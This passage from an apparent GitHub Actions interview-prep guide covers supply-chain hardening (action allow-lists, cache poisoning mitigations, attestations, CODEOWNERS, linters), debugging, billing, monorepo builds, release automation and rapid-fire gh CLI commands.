Assets: secrets, `GITHUB_TOKEN` (write to code, releases, packages), OIDC trust to clouds, runner hosts and their networks, caches and artifacts consumed later. Entry points: untrusted input (fork PRs, comments, branch names), third-party actions and their dependencies, compromised maintainer accounts, self-hosted runner persistence, cache poisoning, and workflow edits by anyone with write access. Controls: least-privilege tokens, environment-gated secrets, OIDC with narrow `sub`, SHA pinning plus allow-lists, no untrusted code in privileged triggers, ephemeral runners, CODEOWNERS on `.github/`, and audit logs streamed to a SIEM.

</details>

### Q177. How do you restrict which actions can run in an organization? 🔴

<details>
<summary><b>Answer</b></summary>

Org Settings, Actions, General, Policies: allow all, only org-owned, or org plus selected (GitHub-authored, verified Marketplace creators, and an explicit list like `docker/*`, `aws-actions/configure-aws-credentials@*`). The policy can also require full SHA pinning and block specific actions or versions. Enterprises set it centrally. A blocked action fails at "Set up job" with a message that the action is not allowed. This turns the supply chain into an explicit, reviewed list.

</details>

### Q178. What is cache poisoning in GitHub Actions? 🔴

<details>
<summary><b>Answer</b></summary>

An attacker who can run code in a workflow that saves caches (for example, through a pwn request on `pull_request_target`, which runs in the default branch scope) writes a malicious cache under a key that later privileged workflows on `main` restore, such as a tampered `node_modules` or build tool. Mitigations: never run untrusted code in default-branch-scoped workflows; do not restore caches in release workflows (build clean); use `actions/cache/restore` without save in sensitive jobs; and keep cache keys tied to lockfile hashes so unexpected keys are not hit.

</details>

### Q179. What are artifact attestations and how do you verify one? 🔴

<details>
<summary><b>Answer</b></summary>

Signed SLSA build provenance generated in the workflow via Sigstore, linking an artifact digest to the repo, workflow, commit and run that built it.

```yaml
permissions:
  id-token: write
  attestations: write
  packages: write
steps:
  - uses: actions/attest-build-provenance@v2
    with:
      subject-name: ghcr.io/devopsshack/shack-api
      subject-digest: ${{ steps.push.outputs.digest }}
      push-to-registry: true
```

```bash
gh attestation verify oci://ghcr.io/devopsshack/shack-api@sha256:... --owner devopsshack
```

Admission controllers (Kyverno, Sigstore policy-controller) can then require provenance before pods run.

</details>

### Q180. How do you protect the workflow files themselves from malicious changes? 🟡

<details>
<summary><b>Answer</b></summary>

CODEOWNERS entry `/.github/ @devopsshack/platform` with "Require review from Code Owners" in branch protection or a ruleset; required approvals on `main`; restrict who can push to release branches and create tags (tag rulesets); environments with branch policies so a modified workflow on a feature branch cannot deploy to prod; OIDC trust tied to `main` or environments; and audit-log alerts on changes to Actions settings, secrets and runner groups.

</details>

### Q181. What do `actionlint` and `zizmor` catch? 🟡

<details>
<summary><b>Answer</b></summary>

`actionlint` is a static checker for workflow syntax and semantics: invalid keys, wrong context availability, type errors in expressions, shellcheck on `run:` scripts, and some injection patterns. `zizmor` is a security auditor: template injection, `pull_request_target` misuse, unpinned actions, excessive permissions, credential persistence from checkout, and dangerous `workflow_run` artifact use. Run both in CI on changes to `.github/**`:

```bash
actionlint -color
zizmor .github/workflows/
```

</details>

### Q182. What should a hardened workflow header look like? 🟢

<details>
<summary><b>Answer</b></summary>

```yaml
name: CI
on:
  pull_request:
  push:
    branches: [main]
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
defaults:
  run:
    shell: bash
jobs:
  test:
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          persist-credentials: false
```

Read-only token, cancellation, strict shell, pinned OS, timeout, pinned action, no persisted credentials.

</details>

---

## Debugging, Cost, Monorepos & Releases

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q183. How do you enable debug logging, and what does each flag show? 🟢

<details>
<summary><b>Answer</b></summary>

- Re-run a job with the **Enable debug logging** checkbox, or
- set a secret or variable `ACTIONS_STEP_DEBUG=true` for step debug logs: every expression evaluation, `##[debug]` lines from actions (`core.debug`), and context values.
- set `ACTIONS_RUNNER_DEBUG=true` for runner diagnostic logs, downloadable as `runner-diagnostic-logs` in the log archive (job assignment, process handling).

```bash
gh variable set ACTIONS_STEP_DEBUG --body true
gh run rerun 1234567890 --debug
```

Turn it off afterwards; debug logs are noisy and may reveal more internal values.

</details>

### Q184. What tools help you inspect a run from the terminal? 🟢

<details>
<summary><b>Answer</b></summary>

```bash
gh run list --workflow ci.yml --branch main --limit 5
gh run view 1234567890 --log-failed
gh run view 1234567890 --job 9876543210 --log
gh run watch
gh run rerun 1234567890 --failed
gh run download 1234567890 -n coverage
gh api repos/ORG/REPO/actions/runs/1234567890/timing
```

`--log-failed` prints only failing steps, which is the fastest way to triage.

</details>

### Q185. How is GitHub Actions billed for private repos, and what are the multipliers? 🟡

<details>
<summary><b>Answer</b></summary>

Public repositories on standard hosted runners are free. Private repos consume included minutes per month (Free 2,000, Pro and Team 3,000, Enterprise 50,000), then pay per minute. Minutes are rounded up per job, and OS multipliers apply to included minutes: Linux 1x, Windows 2x, macOS 10x. Larger runners are always billed per minute at higher rates and do not use included minutes. Storage for artifacts and caches beyond the included amount is billed too. GitHub adjusted runner pricing and self-hosted platform charges for 2026, so check the current billing page before quoting numbers in a cost analysis.

</details>

### Q186. Name the top ways to reduce Actions minutes and wall-clock time. 🟡

<details>
<summary><b>Answer</b></summary>

1. `concurrency` with `cancel-in-progress` on PRs.
2. Path filters and skip docs-only changes.
3. Dependency and Docker layer caching.
4. Short `timeout-minutes` to kill hangs.
5. Smaller matrices on PRs, full matrix on `main` or nightly.
6. Linux instead of Windows or macOS where possible; arm64 runners for arm builds instead of QEMU.
7. Fewer, fatter jobs for tiny tasks (each job has fixed overhead); parallel jobs for long independent ones.
8. Test sharding and running only affected tests in monorepos.
9. Short artifact retention.

Measure first with the run timing API and the Actions usage metrics in org insights.

</details>

### Q187. How do you build only the services that changed in a monorepo? 🔴

<details>
<summary><b>Answer</b></summary>

Compute changed packages in a first job and feed a dynamic matrix:

```yaml
jobs:
  changes:
    runs-on: ubuntu-24.04
    outputs:
      services: ${{ steps.filter.outputs.changes }}
    steps:
      - uses: actions/checkout@v4
      - id: filter
        uses: dorny/paths-filter@v3
        with:
          filters: |
            api: ['services/api/**', 'libs/common/**']
            web: ['apps/web/**', 'libs/common/**']
  build:
    needs: changes
    if: needs.changes.outputs.services != '[]'
    strategy:
      matrix:
        service: ${{ fromJSON(needs.changes.outputs.services) }}
```

Include shared libraries in each filter, and finish with a fan-in `ci-ok` job so required checks work even when nothing changed. Build tools like Nx or Turborepo (`affected`) do the same from the dependency graph.

</details>

### Q188. Why are workflow-level `paths` filters problematic with required checks, and what is the fix? 🟡

<details>
<summary><b>Answer</b></summary>

When the workflow is skipped by `paths`, no check is created, and a required check named `test` stays "Expected — Waiting for status to be reported", blocking the merge forever. Fixes: run the workflow always and decide per job (paths-filter job plus `if`), with a fan-in job that always reports; or make the required check a job that is never skipped. Skipped **jobs** report as success for required checks; skipped **workflows** report nothing.

</details>

### Q189. How do you automate releases with release-please? 🟡

<details>
<summary><b>Answer</b></summary>

release-please reads Conventional Commits on `main`, maintains a release PR that bumps versions and updates `CHANGELOG.md`, and when that PR is merged, creates the tag and GitHub Release.

```yaml
on:
  push:
    branches: [main]
permissions:
  contents: write
  pull-requests: write
jobs:
  release:
    runs-on: ubuntu-24.04
    steps:
      - id: rp
        uses: googleapis/release-please-action@v4
        with:
          release-type: node
          token: ${{ steps.app.outputs.token }}   # App token so the tag triggers workflows
```

Downstream jobs use `if: steps.rp.outputs.release_created` and `steps.rp.outputs.tag_name`. semantic-release is the fully automatic alternative without a release PR.

</details>

### Q190. How do you create a GitHub Release with generated notes from a workflow? 🟢

<details>
<summary><b>Answer</b></summary>

```yaml
on:
  push:
    tags: ["v*.*.*"]
permissions:
  contents: write
jobs:
  release:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v4
      - run: gh release create "$GITHUB_REF_NAME" --generate-notes --verify-tag dist/*.tar.gz
        env:
          GH_TOKEN: ${{ github.token }}
```

`--generate-notes` builds notes from merged PRs since the previous tag, grouped by labels configured in `.github/release.yml`. Add `--prerelease` for `-rc` tags.

</details>

### Q191. What is the "build once, promote by digest" release model in Actions? 🔴

<details>
<summary><b>Answer</b></summary>

CI on `main` builds the image once, scans it and pushes `repo:sha-<short>`; the digest is a job output. Deploys to dev and staging use that digest. A release tag does not rebuild: the release workflow finds the image for the tagged commit and adds a semver tag to the same manifest (in ECR, `batch-get-image` plus `put-image`; in GHCR, `docker buildx imagetools create -t new existing`), then prod deploys the identical digest. What you tested is byte-for-byte what you ship, and rollback is redeploying an older digest.

</details>

### Q192. How do you produce SBOMs and attach them to a release? 🟡

<details>
<summary><b>Answer</b></summary>

```yaml
- uses: anchore/sbom-action@v0
  with:
    image: ${{ env.IMAGE }}@${{ needs.build.outputs.digest }}
    format: spdx-json
    output-file: sbom.spdx.json
- run: gh release upload "$GITHUB_REF_NAME" sbom.spdx.json
  env:
    GH_TOKEN: ${{ github.token }}
```

For stronger guarantees, attach the SBOM as an attestation (`actions/attest-sbom`) so consumers can verify who produced it. Trivy can generate SBOMs too (`trivy image --format cyclonedx`).

</details>

---

## Rapid-fire Commands & Syntax

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q193. Rapid-fire: workflow management with `gh`. 🟢

<details>
<summary><b>Answer</b></summary>

```bash
gh workflow list                          # all workflows and state
gh workflow view ci.yml                   # recent runs of one workflow
gh workflow run deploy.yml -f env=dev     # dispatch
gh workflow disable nightly.yml           # stop a noisy schedule
gh workflow enable nightly.yml
gh run cancel 1234567890
gh run delete 1234567890
```

</details>

### Q194. Rapid-fire: secrets, variables and caches with `gh`. 🟢

<details>
<summary><b>Answer</b></summary>

```bash
gh secret list                    # names only, values never readable
gh secret set API_KEY < key.txt
gh secret set API_KEY --env prod --body "$V"
gh secret delete API_KEY
gh variable list --env prod
gh variable get AWS_REGION
gh cache list --key npm-
gh cache delete --all
```

</details>

### Q195. Rapid-fire: workflow commands you should know. 🟢

<details>
<summary><b>Answer</b></summary>

```bash
echo "::group::Install"; npm ci; echo "::endgroup::"
echo "::notice title=Deploy::Deployed to staging"
echo "::warning file=app.js,line=12::Deprecated API"
echo "::error file=src/a.ts,line=3,col=5::Type error"
echo "::add-mask::$VALUE"
echo "::debug::Only visible with ACTIONS_STEP_DEBUG"
token=$(openssl rand -hex 8); echo "::stop-commands::$token"; cat untrusted.log; echo "::$token::"
```

`stop-commands` prevents untrusted output from being interpreted as workflow commands.

</details>

### Q196. Rapid-fire: environment files. 🟢

<details>
<summary><b>Answer</b></summary>

```bash
echo "digest=$DIGEST" >> "$GITHUB_OUTPUT"   # step output
echo "TAG=sha-${GITHUB_SHA::7}" >> "$GITHUB_ENV"   # env for later steps
echo "$HOME/bin" >> "$GITHUB_PATH"          # PATH for later steps
echo "| env | digest |" >> "$GITHUB_STEP_SUMMARY"
echo "tmpdir=$d" >> "$GITHUB_STATE"         # main to post script (JS actions)
```

</details>

### Q197. Rapid-fire: status functions in one line each. 🟢

<details>
<summary><b>Answer</b></summary>

- `success()`: all previous steps (or needed jobs) succeeded; implicit default.
- `failure()`: any previous step or needed job failed.
- `cancelled()`: the workflow was cancelled.
- `always()`: run regardless, even on cancel; use for cleanup only.
- `!cancelled()`: run on success or failure but not on cancel; the safer "always".

</details>

### Q198. Rapid-fire: five expressions you will write every week. 🟡

<details>
<summary><b>Answer</b></summary>

```yaml
if: github.event_name == 'push' && github.ref == 'refs/heads/main'
if: startsWith(github.ref, 'refs/tags/v')
if: contains(github.event.pull_request.labels.*.name, 'run-e2e')
key: deps-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}
matrix: ${{ fromJSON(needs.plan.outputs.matrix) }}
```

</details>

### Q199. Rapid-fire: inspecting runners and usage through the API. 🟡

<details>
<summary><b>Answer</b></summary>

```bash
gh api orgs/ORG/actions/runners --jq '.runners[] | {name, status, busy, labels: [.labels[].name]}'
gh api -X POST orgs/ORG/actions/runners/registration-token --jq .token
gh api repos/ORG/REPO/actions/runs --jq '.workflow_runs[0:5][] | {id, name, conclusion}'
gh api repos/ORG/REPO/actions/cache/usage
gh api repos/ORG/REPO/actions/permissions
```

</details>

### Q200. Rapid-fire: what would you check first for each symptom? 🟡

<details>
<summary><b>Answer</b></summary>

- Workflow never starts: file location and YAML validity, `on` filters, workflow on default branch, Actions enabled, `[skip ci]`.
- Job stuck "Waiting for a runner": `runs-on` labels, runner online and in an allowed group, concurrency limit.
- `Resource not accessible by integration`: `permissions` block, fork PR read-only token.
- OIDC `Not authorized to perform sts:AssumeRoleWithWebIdentity`: `id-token: write`, trust policy `sub` vs actual claim (environment form).
- Cache never hits: key includes something that changes every run, or branch scope.
- Deploy job skipped: a `needs` dependency skipped or failed; check `needs.*.result`.

</details>

---

[⬅ Back to GitHub Actions](./README.md) · [🏠 Home](../README.md)

<!-- DEVOPS-SHACK:FOOTER -->
---

<div align="center">

### 🚀 Made with ❤️ by [DevOps Shack](https://www.youtube.com/@devopsshack)

**Learn DevOps, DevSecOps, Cloud and Kubernetes the practical way.**

[▶️ YouTube — DevOps Shack](https://www.youtube.com/@devopsshack) · [▶️ Hindi — @shackverse](https://www.youtube.com/@shackverse) · [🎓 devopsshack.com](https://devopsshack.com) · [📸 Instagram @devopsshack](https://www.instagram.com/devopsshack)

[🏠 Back to Home](../README.md) · [⭐ Star the original repo](https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack)

<sub>© DevOps Shack · Licensed CC BY-NC-SA 4.0 · If you found this copy anywhere other than <a href="https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack">github.com/jaiswaladi246</a>, the original and latest version is maintained by DevOps Shack.</sub>

</div>
<!-- /DEVOPS-SHACK:FOOTER -->
